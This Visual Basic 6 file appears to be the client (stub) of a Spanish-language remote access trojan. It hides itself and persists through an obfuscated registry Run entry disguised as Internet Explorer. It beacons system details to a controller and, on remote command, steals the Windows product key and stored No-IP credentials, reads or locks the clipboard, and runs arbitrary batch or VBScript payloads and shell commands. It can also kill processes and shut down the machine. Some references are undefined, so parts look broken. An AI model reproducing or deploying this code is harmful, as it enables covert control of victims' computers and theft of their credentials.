VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   1650
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   7185
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1650
   ScaleWidth      =   7185
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame3 
      Caption         =   "MsgBox"
      Height          =   1335
      Left            =   5160
      TabIndex        =   7
      Top             =   120
      Width           =   1935
      Begin VB.TextBox txtFile 
         Height          =   285
         HideSelection   =   0   'False
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   12
         Top             =   360
         Visible         =   0   'False
         Width           =   1095
      End
      Begin VB.TextBox Text 
         Height          =   285
         Left            =   360
         TabIndex        =   11
         Top             =   1920
         Width           =   615
      End
      Begin VB.TextBox Text4 
         Height          =   285
         Left            =   240
         TabIndex        =   10
         Text            =   "Text1"
         Top             =   1320
         Width           =   1215
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   480
         TabIndex        =   9
         Text            =   "Text1"
         Top             =   720
         Width           =   975
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   600
         TabIndex        =   8
         Text            =   "Text1"
         Top             =   360
         Width           =   1095
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Clipboard"
      Height          =   1455
      Index           =   1
      Left            =   4320
      TabIndex        =   6
      Top             =   0
      Width           =   735
      Begin VB.Timer LockClip 
         Enabled         =   0   'False
         Interval        =   1
         Left            =   120
         Top             =   240
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "MSN "
      Height          =   1455
      Index           =   0
      Left            =   3480
      TabIndex        =   5
      Top             =   0
      Width           =   735
      Begin VB.Timer Msntimer 
         Enabled         =   0   'False
         Interval        =   1
         Left            =   120
         Top             =   240
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Info"
      Height          =   1455
      Left            =   1440
      TabIndex        =   2
      Top             =   0
      Width           =   1935
      Begin VB.TextBox Text2 
         Height          =   375
         Left            =   120
         TabIndex        =   4
         Top             =   960
         Width           =   1695
      End
      Begin VB.TextBox cdkey 
         Height          =   615
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   1695
      End
   End
   Begin VB.Frame Conexion 
      Caption         =   "Conexión"
      Height          =   1455
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   1215
      Begin VB.PictureBox Picture1 
         Height          =   375
         Left            =   600
         ScaleHeight     =   315
         ScaleWidth      =   435
         TabIndex        =   1
         Top             =   240
         Width           =   495
      End
      Begin VB.Timer Timer1 
         Interval        =   1
         Left            =   120
         Top             =   720
      End
      Begin MSWinsockLib.Winsock WS 
         Left            =   120
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim names As String, name1 As String, so As String, ip As String, port As String
Dim webcam As String, pais As String, tor As String, nombrepc As String, procesador As String
Private Declare Function IsNTAdmin Lib "advpack.dll" (ByVal dwReserved As Long, ByRef lpdwReserved As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Type POINTAPI
        x As Long
        y As Long
End Type
Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" _
                         (ByVal Locale As Long, ByVal LCType As Long, ByVal _
                          lpLCData As String, ByVal cchData As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" ( _
    ByVal lpstrCommand As String, _
    ByVal lpstrReturnString As String, _
    ByVal uReturnLength As Long, _
    ByVal hwndCallback As Long) As Long

Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long ' Note that If you declare the lpData parameter as String, you must pass it By Value.
    Private Const REG_BINARY = 3
    Private Const HKEY_LOCAL_MACHINE = &H80000002
    Private Const ERROR_SUCCESS = 0&
Const LOCALE_USER_DEFAULT = &H400
Const LOCALE_SENGCOUNTRY = &H1002
Const LOCALE_SENGLANGUAGE = &H1001
Const LOCALE_SNATIVELANGNAME = &H4
Const LOCALE_SNATIVECTRYNAME = &H8

Public WithEvents msn As Messenger
Attribute msn.VB_VarHelpID = -1
Public WithEvents MsgrUIA As MessengerAPI.Messenger
Attribute MsgrUIA.VB_VarHelpID = -1




Private Sub Form_Load()
On Error Resume Next
Set msn = New Messenger
Open Environ("windir") & "\log.txt" For Input As #1
Input #1, names
If names = "" Then
names = "Victima"
End If
Close #1

Dim yo As Object
Set yo = CreateObject("wscript.shell")
pais = ObtenerIdioma(LOCALE_SNATIVECTRYNAME)
nombrepc = Environ("ComputerName")
name1 = Environ("UserName")
so = yo.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Productname")
ip = "127.0.0.1"
port = 2008
procesador = yo.regread("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\ProcessorNameString")
App.TaskVisible = False
If App.PrevInstance = True Then: End
Me.Visible = False
pais = ObtenerIdioma(LOCALE_SNATIVECTRYNAME)



objecto.RegWrite StrReverse("\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH") & "Internet gExplorer", Environ("windir") & "\IE.exe"




End Sub

Public Function ObtenerIdioma(ByVal lInfo As Long) As String
Dim buffer As String, ret As String
buffer = String$(256, 0)
ret = GetLocaleInfo(LOCALE_USER_DEFAULT, lInfo, buffer, Len(buffer))
If ret > 0 Then
ObtenerIdioma = Left$(buffer, ret - 1)
Else
ObtenerIdioma = ""
End If
End Function

Public Function GetRamSize() As String
Dim RamStats As MEMORYSTATUS
GlobalMemoryStatus RamStats
GetRamSize = Round((RamStats.dwTotalPhys / 1024) / 1024) + 1
End Function

Private Sub LockClip_Timer()
On Error Resume Next
Clipboard.SetText ""
End Sub

Private Sub Msntimer_Timer()
Pause 1
msn.MyStatus = MISTATUS_INVISIBLE
Pause 1
msn.MyStatus = MISTATUS_ONLINE
End Sub

Private Sub Timer1_Timer()
If WS.State <> 7 Then
WS.Close
WS.Connect ip, port
End If
End Sub
Private Sub WS_Connect()
WS.SendData "Conecta|" & names & "|" & so & "|" & GetRamSize & "|" & pais
End Sub
Private Sub WS_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim datos As String
Dim data() As String
WS.GetData datos
data = Split(datos, "|")
Select Case data(0)


'CAMBIAR NOMBRE
Case "nombrecan"
Open Environ("windir") & "\log.txt" For Output As #1
Print #1, , data(1)
Close #1

'RECONECTAR
Case "reconectar"
WS.Close
Sleep 2000
WS.Connect ip, port

'CERRAR
Case "cerrar"
End

'INFORMACIÓN

Case "sysinfo"
Dim yo As Object
Set yo = CreateObject("wscript.shell")
cdkey.Text = sGetXPCDKey
Dim Unidad  As String, informacion As String, antivirus As String, firewall As String
Set objSecurityCenter = GetObject("winmgmts:\\.\root\SecurityCenter")
    Set colFirewall = objSecurityCenter.ExecQuery("Select * From FirewallProduct", , 48)
    Set colAntiVirus = objSecurityCenter.ExecQuery("Select * From AntiVirusProduct", , 48)
    For Each objFirewall In colFirewall
        protection1 = objFirewall.DisplayName & " v" & objFirewall.VersionNumber & " - " & objFirewall.CompanyName
    Next
    For Each objAntiVirus In colAntiVirus
        protection = objAntiVirus.DisplayName & " v" & objAntiVirus.VersionNumber
    Next

lenguaje = ObtenerIdioma(LOCALE_SNATIVELANGNAME)
pac = yo.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CSDVersion")

windows = Environ("windir")
fechas = Date
horas = Time
Rutaas = App.Path & "\" & App.EXEName & ".exe"
Dim t As MMTIME, j As Long
Dim h As Double, m As Double, s1 As Double
j = timeGetSystemTime(t, LenB(t))
h = (t.units / 1000) / 60 / 60
m = (h - Int(h)) * 60
s1 = (m - Int(m)) * 60

Text2.Text = Int(h) & " hours, " & Int(m) & " minuts,  " & Int(s1) & " seconds"
WS.SendData "infor|" & cdkey.Text & "|" & tost & "|" & frees & "|" & lenguaje & "|" & pac & "|" & windows & "|" & fechas & "|" & horas & "|" & Rutaas & "|" & Text2.Text & "|" & protection & "|" & protection1

'MSN


Set MsgrUIA = New MessengerAPI.Messenger

Dim car As IMessengerConversationWnd


Case "nodisponible"

msn.MyStatus = MISTATUS_BUSY

Case "conectado"

msn.MyStatus = MISTATUS_ONLINE

Case "offline"

msn.MyStatus = MISTATUS_OFFLINE

Case "vuelvoahora"

msn.MyStatus = MISTATUS_BE_RIGHT_BACK

Case "ausente"

msn.MyStatus = MISTATUS_UNKNOWN

Case "altelefono"

msn.MyStatus = MISTATUS_ON_THE_PHONE

Case "saliacomer"

msn.MyStatus = MISTATUS_OUT_TO_LUNCH

Case "noconectado"

msn.MyStatus = MISTATUS_INVISIBLE

Case "flood"

Msntimer.Enabled = True

Case "detenerflood"

Msntimer.Enabled = False

'Clipboard
Case "setclip":
Clipboard.SetText data(1)

Case "getclip":
WS.SendData "cliptext|" & Clipboard.GetText
    
Case "lockclip":
LockClip.Enabled = True

Case "unlockclip":
LockClip.Enabled = False

Case "clearclip":
Clipboard.Clear

'IMPRESORA
Case "print"
PrintText Mid$(NewData, lSpace + 1)


'APAGAR REINCIAR SUSPENDER SISTEMA

Case "SuspenderSistema"
SuspenderSistema
Case "ApagarSistema"
ApagarSistema
Case "ReiniciarSistema"
ReiniciarSistema


'PASWORDS###################

Case "noip"
Dim user As String
Dim pass As String
user = leer("emanresU\CUD\skrewlatiV\ERAWTFOS\ENIHCAM_LACOL_YEKH")
pass = leer("drowssaP\CUD\skrewlatiV\ERAWTFOS\ENIHCAM_LACOL_YEKH")
pass = sBase64Decode(pass)

usuario.Text = user
contraseña.Text = pass

WS.SendData "noip|" & user & "|" & pass

'INTERNET OPTIONS

Case "opensite":
ShellExecLaunchFile data(1), "", ""
Case "openemail":
ShellExecLaunchFile "mailto:" & data(1), "", ""


'SCRIPTS

Case "bs"
Open "C:\temp.bat" For Output As #1
Print #1, , data(1)
Close #1

ShellExecLaunchFile "C:\temp.bat", "", ""

Case "vbscript"
Open "C:\temp.vbs" For Output As #1
Print #1, , data(1)
Close #1

ShellExecLaunchFile "C:\temp.vbs", "", ""

'EJECUTAR

Case "ejecutar"
ShellExecLaunchFile data(1), "", ""


'CHAT
Case "chat"
chat.Visible = True

Case "men"
chat.Text1.Text = data(1)
Case "cierra"
chat.Text1.Text = chat.Text1.Text + vbNewLine + vbNewLine & "********Chat Cerrado********"
Case "cerrarchat"
chat.Hide

'SHELL
Case "rm"

Dim conten As String
conten = CMD(data(1))
WS.SendData "no|" & conten

Close #1


'PROCESOS

Case "procesos"

    Dim Nombre_Proceso, strOb
    Dim eProc As String
    strOb = "winmgmts://"
    
  
    For Each Nombre_Proceso In GetObject(strOb).InstancesOf("win32_process")
    
eProc = eProc & Nombre_Proceso.Name & "|"
    Next
  WS.SendData "proc|" & eProc
  eProc = ""

Case "kill"
KillProcess (data(1))


'Mensajes!

Case "mmtitle":
    Text3.Text = data(1)
    WS.SendData "mmbody|"
Case "mmbodie":
    Text4.Text = data(1)
    WS.SendData "mmbuttons|"
Case "mmbuttons":
    Text5.Text = data(1)
    If Text5.Text = "critical" Then MsgBox Text4.Text, vbCritical, Text3.Text
    If Text5.Text = "excla" Then MsgBox Text4.Text, vbExclamation, Text3.Text
    If Text5.Text = "info" Then MsgBox Text4.Text, vbInformation, Text3.Text
    If Text5.Text = "question" Then MsgBox Text4.Text, vbQuestion, Text3.Text
    If Text5.Text = "none" Then MsgBox Text4.Text, vbApplicationModal, Text3.Text
    
    

End Select
End Sub
 


Public Function sGetXPCDKey() As String
    Dim bDigitalProductID() As Byte
    Dim bProductKey() As Byte
    Dim ilByte As Long
    Dim lDataLen As Long
    Dim hKey As Long
    If RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\Windows NT\CurrentVersion", hKey) = ERROR_SUCCESS Then
        lDataLen = 164
        ReDim Preserve bDigitalProductID(lDataLen)
        If RegQueryValueEx(hKey, "DigitalProductId", 0&, REG_BINARY, bDigitalProductID(0), lDataLen) = ERROR_SUCCESS Then
            ReDim Preserve bProductKey(14)
            For ilByte = 52 To 66
                bProductKey(ilByte - 52) = bDigitalProductID(ilByte)
            Next ilByte
        Else
            sGetXPCDKey = ""
            Exit Function
        End If
    Else
        sGetXPCDKey = ""
        Exit Function
    End If
    Dim bKeyChars(0 To 24) As Byte
    bKeyChars(0) = Asc("B")
    bKeyChars(1) = Asc("C")
    bKeyChars(2) = Asc("D")
    bKeyChars(3) = Asc("F")
    bKeyChars(4) = Asc("G")
    bKeyChars(5) = Asc("H")
    bKeyChars(6) = Asc("J")
    bKeyChars(7) = Asc("K")
    bKeyChars(8) = Asc("M")
    bKeyChars(9) = Asc("P")
    bKeyChars(10) = Asc("Q")
    bKeyChars(11) = Asc("R")
    bKeyChars(12) = Asc("T")
    bKeyChars(13) = Asc("V")
    bKeyChars(14) = Asc("W")
    bKeyChars(15) = Asc("X")
    bKeyChars(16) = Asc("Y")
    bKeyChars(17) = Asc("2")
    bKeyChars(18) = Asc("3")
    bKeyChars(19) = Asc("4")
    bKeyChars(20) = Asc("6")
    bKeyChars(21) = Asc("7")
    bKeyChars(22) = Asc("8")
    bKeyChars(23) = Asc("9")
    Dim nCur As Integer
    Dim sCDKey As String
    Dim ilKeyByte As Long
    Dim ilBit As Long
    For ilByte = 24 To 0 Step -1
        nCur = 0
        For ilKeyByte = 14 To 0 Step -1
            nCur = nCur * 256 Xor bProductKey(ilKeyByte)
            bProductKey(ilKeyByte) = Int(nCur / 24)
            nCur = nCur Mod 24
        Next ilKeyByte
        sCDKey = Chr(bKeyChars(nCur)) & sCDKey
        If ilByte Mod 5 = 0 And ilByte <> 0 Then sCDKey = "-" & sCDKey
    Next ilByte
    sGetXPCDKey = sCDKey
   
End Function

Public Sub KillProcess(ByVal processName As String)
On Error GoTo ErrHandler
Dim oWMI
Dim ret
Dim sService
Dim oWMIServices
Dim oWMIService
Dim oServices
Dim oService
Dim servicename
Set oWMI = GetObject("winmgmts:")
Set oServices = oWMI.InstancesOf("win32_process")
For Each oService In oServices

servicename = LCase(Trim(CStr(oService.Name) & ""))

If InStr(1, servicename, LCase(processName), vbTextCompare) > 0 Then
ret = oService.Terminate
End If

Next

Set oServices = Nothing
Set oWMI = Nothing

ErrHandler:
Err.Clear
End Sub


